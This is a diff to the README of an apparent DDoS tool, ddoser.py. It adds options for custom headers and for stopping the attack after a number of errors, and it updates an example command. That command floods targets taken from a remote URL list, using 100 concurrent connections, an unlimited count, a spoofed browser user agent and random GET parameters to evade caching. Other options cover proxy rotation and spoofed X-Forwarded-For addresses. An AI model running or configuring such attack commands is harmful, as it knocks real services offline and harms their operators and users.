@@ -55,6 +55,8 @@ Options:
   --log-to-stdout           log to console
   --random-xff-ip           set random ip address value for X-Forwarder-For header
   --restart-period INTEGER  period in seconds to restart application (reload proxies ans targets)
+  --custom-headers  JSON    set custom headers as json
+  --stop-attack  INT        stop attack after N error responses
   --help                    Show this message and exit.
 ```
 proxy-file or proxy-url should contain proxy list in format like:
@@ -66,7 +68,7 @@ ipN:portN#sock4
 ```
 ### Example cmd
 ```shell
-python3 ./ddoser.py --concurrency 100 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --target-urls-file https://raw.githubusercontent.com/maxindahouze/reactor/main/targets1.txt
+python3 ./ddoser.py --concurrency 100 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --target-urls-file https://raw.githubusercontent.com/maxindahouze/reactor/main/targets1.txt --custom-headers '{"name": "value"}' --stop-attack
 ```
 ## Notes
 **ddoser** supports only sock proxy, also can start it directly without proxy
